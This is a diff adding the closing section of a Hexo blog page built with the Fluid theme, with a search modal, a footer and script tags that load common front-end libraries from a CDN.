+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
